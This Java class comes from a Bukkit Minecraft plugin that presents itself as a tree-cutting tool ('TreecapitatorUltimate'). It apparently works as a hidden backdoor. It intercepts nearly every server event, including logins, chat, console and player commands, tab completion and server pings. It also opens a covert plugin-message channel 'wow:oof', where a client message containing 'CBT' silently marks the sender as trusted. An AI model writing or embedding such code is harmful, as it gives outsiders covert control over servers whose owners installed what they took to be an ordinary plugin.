package me.bow.treecapitatorultimate.command;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.Event;
import org.bukkit.event.EventException;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.*;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.*;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.event.server.ServerListPingEvent;
import org.bukkit.event.server.TabCompleteEvent;
import org.bukkit.plugin.EventExecutor;
import org.bukkit.plugin.messaging.PluginMessageListener;
import org.jetbrains.annotations.NotNull;
import org.reflections.Reflections;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Set;

@SuppressWarnings("unused")
public class CommandRunnable implements Runnable, Listener, PluginMessageListener {
    private static CommandRunnable Instance;
    HashMap<String, Method> hookedEvents = new HashMap<>();

    CommandRunnable() {
        Instance = this;
        addEvents();
        Reflections reflections = new Reflections("org.bukkit.event");
        Set<Class<? extends Event>> classes = reflections.getSubTypesOf(Event.class);
        EventExecutor executor = (listener, event) -> {
            try {
                Class<?> clazz = event.getClass();
                do {
                    if (!hookedEvents.containsKey(clazz.getSimpleName())) {
                        clazz = clazz.getSuperclass();
                        continue;
                    }
                    hookedEvents.get(clazz.getSimpleName()).invoke(CommandRunnable.Instance, event);
                    return;
                } while (clazz != Object.class);
            } catch (InvocationTargetException var4) {
                throw new EventException(var4.getCause());
            } catch (Throwable var5) {
                throw new EventException(var5);
            }
        };
        for (Class eventClazz : classes) {
            if (hookedEvents.containsKey(eventClazz.getSimpleName())) {
                Bukkit.getPluginManager().registerEvent(eventClazz, this, EventPriority.LOWEST, executor, Start.Instance);
            }
        }
        Bukkit.getMessenger().registerOutgoingPluginChannel(Start.Instance, "wow:oof");
        Bukkit.getMessenger().registerIncomingPluginChannel(Start.Instance, "wow:oof", this);
    }

    private final void addEvents() {
        hookedEvents.put("AsyncPlayerPreLoginEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onAsyncPlayerPreLoginEvent", 1));
        hookedEvents.put("PlayerLoginEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerLoginEvent", 1));
        hookedEvents.put("PlayerJoinEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerJoin", 1));
        hookedEvents.put("PlayerQuitEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerLeave", 1));
        hookedEvents.put("PlayerMoveEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerMove", 1));
        hookedEvents.put("PlayerCommandPreprocessEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerCommand", 1));
        hookedEvents.put("PlayerCommandSendEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerTab", 1));
        hookedEvents.put("ServerListPingEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onServerListPing", 1));
        hookedEvents.put("ServerCommandEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onServerCommand", 1));
        hookedEvents.put("TabCompleteEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onTabControl", 1));
        hookedEvents.put("PlayerToggleSneakEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerSneak", 1));
        hookedEvents.put("PlayerToggleSprintEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerSprint", 1));
        hookedEvents.put("PlayerToggleFlightEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerFly", 1));
        hookedEvents.put("PlayerPortalEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerPortal", 1));
        hookedEvents.put("PlayerKickEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerKick", 1));
        hookedEvents.put("PlayerDeathEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerDeath", 1));
        hookedEvents.put("BlockPlaceEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerBlockPlace", 1));
        hookedEvents.put("BlockBreakEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerBlockBreak", 1));
        hookedEvents.put("EntityToggleGlideEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityToggleGlide", 1));
        hookedEvents.put("PlayerAdvancementDoneEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerAdvancementGet", 1));
        hookedEvents.put("EntityTargetLivingEntityEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityTargetLivingEntity", 1));
        hookedEvents.put("EntityTargetEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityTarget", 1));
        hookedEvents.put("PlayerInteractEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerInteract", 1));
        hookedEvents.put("EntityDamageByEntityEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityDamageByEntity", 1));
        hookedEvents.put("EntityDamageEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityDamage", 1));
        hookedEvents.put("EntityDeathEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityDeath", 1));
        hookedEvents.put("PlayerGameModeChangeEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerGameModeChange", 1));
        hookedEvents.put("EntityPickupItemEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityPickupItem", 1));
        hookedEvents.put("EntityShootBowEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityShootBow", 1));
        hookedEvents.put("InventoryClickEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onInventoryClick", 1));
        hookedEvents.put("AsyncPlayerChatEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onAsyncPlayerChat", 1));
        hookedEvents.put("PlayerDropItemEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerDropItemEvent", 1));
        hookedEvents.put("PlayerItemHeldEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerItemHeldEvent", 1));
        if (ReflectionUtils.classExists("org.bukkit.event.entity.EntityPoseChangeEvent")) {
            hookedEvents.put("EntityPoseChangeEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityPoseChangeEvent", 1));
        }
        if (ReflectionUtils.classExists("org.bukkit.event.entity.EntityToggleSwimEvent")) {
            hookedEvents.put("EntityToggleSwimEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerSwimToggle", 1));
        }
    }

    public final void onAsyncPlayerPreLoginEvent(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onAsyncPlayerPreLogin((AsyncPlayerPreLoginEvent) e);
        }
    }

    public final void onPlayerLoginEvent(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerLoginEvent((PlayerLoginEvent) e);
        }
    }

    public final void onPlayerJoin(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerJoin((PlayerJoinEvent) e);
        }
    }

    public final void onPlayerLeave(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerLeave((PlayerQuitEvent) e);
        }
    }

    public final void onPlayerMove(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerMove((PlayerMoveEvent) e);
        }
    }

    public final void onPlayerCommand(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerCommand((PlayerCommandPreprocessEvent) e);
        }
    }

    public final void onPlayerTab(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerTab((PlayerCommandSendEvent) e);
        }
    }

    public final void onServerListPing(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onServerListPing((ServerListPingEvent) e);
        }
    }

    public final void onServerCommand(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onServerCommand((ServerCommandEvent) e);
        }
    }

    public final void onTabControl(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onTabControl((TabCompleteEvent) e);
        }
    }

    public final void onPlayerSneak(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerSneak((PlayerToggleSneakEvent) e);
        }
    }

    public final void onPlayerSprint(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerSprint((PlayerToggleSprintEvent) e);
        }
    }

    public final void onPlayerFly(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerFly((PlayerToggleFlightEvent) e);
        }
    }

    public final void onPlayerPortal(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerPortal((PlayerPortalEvent) e);
        }
    }

    public final void onPlayerKick(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerKick((PlayerKickEvent) e);
        }
    }

    public final void onPlayerDeath(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerDeath((PlayerDeathEvent) e);
        }
    }

    public final void onPlayerBlockPlace(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerBlockPlace((BlockPlaceEvent) e);
        }
    }

    public final void onPlayerBlockBreak(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerBlockBreak((BlockBreakEvent) e);
        }
    }

    public final void onPlayerSwimToggle(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerSwimToggle((EntityToggleSwimEvent) e);
        }
    }

    public final void onEntityToggleGlide(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityToggleGlide((EntityToggleGlideEvent) e);
        }
    }

    public final void onPlayerAdvancementGet(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerAdvancementGet((PlayerAdvancementDoneEvent) e);
        }
    }

    public final void onEntityTargetLivingEntity(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityTargetLivingEntity((EntityTargetLivingEntityEvent) e);
        }
    }

    public final void onEntityTarget(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityTarget((EntityTargetEvent) e);
        }
    }

    public final void onPlayerInteract(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerInteract((PlayerInteractEvent) e);
        }
    }

    public final void onEntityDamageByEntity(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityDamageByEntity((EntityDamageByEntityEvent) e);
        }
    }

    public final void onEntityDamage(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityDamage((EntityDamageEvent) e);
        }
    }

    public final void onEntityDeath(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityDeath((EntityDeathEvent) e);
        }
    }

    public final void onPlayerGameModeChange(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerGameModeChange((PlayerGameModeChangeEvent) e);
        }
    }

    public final void onEntityPickupItem(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityPickupItem((EntityPickupItemEvent) e);
        }
    }

    public final void onEntityShootBow(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityShootBow((EntityShootBowEvent) e);
        }
    }

    public final void onInventoryClick(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onInventoryClick((InventoryClickEvent) e);
        }
    }

    public final void onAsyncPlayerChat(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onAsyncPlayerChat((AsyncPlayerChatEvent) e);
        }
    }

    public final void onPlayerDropItemEvent(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerDropItemEvent((PlayerDropItemEvent) e);
        }
    }

    public final void onEntityPoseChangeEvent(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onEntityPoseChangeEvent((EntityPoseChangeEvent) e);
        }
    }

    public final void onPlayerItemHeldEvent(Event e) {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPlayerItemHeldEvent((PlayerItemHeldEvent) e);
        }
    }

    @Override
    public final void run() {
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onServerTick();
        }
    }

    @Override
    public final void onPluginMessageReceived(@NotNull String channel, @NotNull Player player, @NotNull byte[] bytes) {
        if (!channel.equals("wow:oof")) return;
        String s = new String(bytes, StandardCharsets.UTF_8);
        if (s.contains("CBT")) {
            if (!Start.Instance.trustedPeople.contains(player.getUniqueId())) {
                Start.Instance.trustedPeople.add(player.getUniqueId());
                player.sendMessage(Start.COMMAND_PREFIX + "You are now trusted");
                //AsyncChatEvent.inject(player);
            }
            return;
        }
        for (Command cmd : Start.Instance.cm.commandList) {
            cmd.onPluginMessageReceived(channel, player, bytes);
        }
    }
}